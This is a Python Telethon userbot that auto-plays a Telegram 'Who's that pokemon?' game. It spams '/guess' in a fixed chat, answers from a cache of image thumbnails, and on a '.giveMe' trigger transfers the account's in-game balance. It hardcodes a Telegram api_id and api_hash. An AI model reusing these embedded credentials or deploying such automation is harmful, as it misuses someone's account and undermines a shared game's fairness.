import os
import asyncio
from telethon import events, TelegramClient
from telethon.tl.types import PhotoStrippedSize
from datetime import datetime

# ANSI Color Codes for UI
CYAN = "\033[96m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
MAGENTA = "\033[95m"
BLUE = "\033[94m"
BOLD = "\033[1m"
RESET = "\033[0m"

def timestamp():
    return datetime.now().strftime("%H:%M:%S")

def log_info(msg):
    print(f"{CYAN}[{timestamp()}] [INFO] {msg}{RESET}")

def log_success(msg):
    print(f"{GREEN}[{timestamp()}] [SUCCESS] {msg}{RESET}")

def log_warning(msg):
    print(f"{YELLOW}[{timestamp()}] [WARN] {msg}{RESET}")

def log_action(msg):
    print(f"{MAGENTA}[{timestamp()}] [ACTION] {msg}{RESET}")

def print_banner():
    banner = f"""{CYAN}{BOLD}
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║                 ⚡ POKEMON GUESS SOLVER BOT ⚡                ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝{RESET}
{BLUE}  ► Status  : {GREEN}Online & Listening{RESET}
{BLUE}  ► Chat ID : {YELLOW}-1002050945918{RESET}
{CYAN}════════════════════════════════════════════════════════════════{RESET}
"""
    print(banner)


api_id = 23892949
api_hash = '44d07c2f92d37fe3c08e918ca11c2985'
guessSolver = TelegramClient('temp', api_id, api_hash)
chatid = -1002050945918 # change


@guessSolver.on(events.NewMessage(from_users=6573664248, pattern=".bin", outgoing=True))
async def guesser(event):
    log_action("Auto-guess loop started (.bin triggered)")
    await guessSolver.send_message(entity=chatid, message='/guess')
    for i in range(1, 3000):
        await asyncio.sleep(30)
        log_action(f"Sending auto /guess [{i}/3000]")
        await guessSolver.send_message(entity=chatid, message='/guess')


@guessSolver.on(events.NewMessage(from_users=572621020, pattern="Who's that pokemon?", chats=(int(chatid)), incoming=True))
async def guesser(event):
    log_info("Received 'Who's that pokemon?' prompt")
    for size in event.message.photo.sizes:
        if isinstance(size, PhotoStrippedSize):
            size = str(size)
            matched = False
            for file in (os.listdir("cache/")):
                with open(f"cache/{file}", 'r') as f:
                    file_content = f.read()
                if file_content == size:
                    chat = await event.get_chat()
                    fiel = file.split(".txt")[0]
                    log_success(f"Pokemon Matched: {fiel}")
                    await guessSolver.send_message(chat, fiel)
                    await asyncio.sleep(10)
                    await guessSolver.send_message(chat, "/guess")
                    matched = True
                    break
            if not matched:
                log_warning("Pokemon image not found in cache. Storing unknown image size...")
            with open("cache.txt", 'w') as file:
                file.write(size)
            file.close()


@guessSolver.on(events.NewMessage(from_users=572621020, pattern="The pokemon was ", chats=int(chatid)))
async def guesser(event):
    massage = ((event.message.text).split("The pokemon was ")[1]).split(".")[0]
    log_info(f"Learned Pokemon identity: {massage}")
    with open(f"cache/{massage}.txt", 'w') as file:
        with open("cache.txt", 'r') as inf:
            cont = inf.read()
            file.write(cont)
        inf.close()
    file.close()
    os.remove("cache.txt")
    log_success(f"Saved {massage}.txt to cache!")
    chat = await event.get_chat()
    await guessSolver.send_message(chat, "/guess")


@guessSolver.on(events.NewMessage(from_users=1235684181, pattern=".giveMe", incoming=True))
async def guesser(event):
    log_action("Received .giveMe command, checking inventory...")
    x = await guessSolver.send_message("@HeXamonbot", '/myinventory')
    async with guessSolver.conversation('@Hexamonbot') as conv:
        response = await conv.get_response(x.id)
        bal = response.text.split(": ")[1].split("**\n")[0]
    if bal != '0':
        log_success(f"Transferring balance: {bal}")
        await asyncio.sleep(2)
        await event.reply(("/give " + str(bal)))
    else:
        log_info("Balance is 0, no transfer needed.")


print_banner()
log_info("Starting Guess Solver Bot...")
guessSolver.start()
log_success("Bot is running and listening for events!")
guessSolver.run_until_disconnected()
